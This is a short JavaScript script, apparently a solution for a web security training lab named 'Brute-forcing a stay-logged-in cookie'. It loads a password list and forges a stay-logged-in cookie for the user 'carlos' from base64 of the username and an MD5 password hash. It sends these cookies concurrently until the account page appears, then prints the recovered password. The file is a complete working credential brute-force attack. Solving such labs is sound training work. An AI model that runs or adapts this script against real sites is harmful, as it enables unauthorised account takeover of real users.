import md5 from "md5";
import { getParsedInput } from "../../../utils/getParsedInput.js";
import { runTasks } from "../../../utils/runTasks.js";
import { getPasswords } from "../../../utils/config.js";

const { url, concurrencyLimit, httpClient } = getParsedInput({
  description: "Lab: Brute-forcing a stay-logged-in cookie",
  concurrency: true,
});

const passwords = await getPasswords();

async function task(password) {
  const hash = md5(password);
  const payload = Buffer.from(`carlos:${hash}`).toString("base64");
  const cookie = "stay-logged-in=" + payload;
  let resp;

  try {
    resp = await httpClient.get(url, {
      headers: {
        cookie: cookie,
      },
    });
  } catch (e) {
    console.log(e);
    process.exit(1);
  }

  if (resp.data.includes("my-account?id=carlos")) {
    console.log(`${password}: success`);
    console.log(
      `Login with username "carlos" and password "${password}" to solve the lab`,
    );
    process.exit(0);
  } else {
    console.log(`${password}: fail`);
  }
}

const tasks = [];
for (const password of passwords) {
  tasks.push(() => task(password));
}

await runTasks(tasks, concurrencyLimit);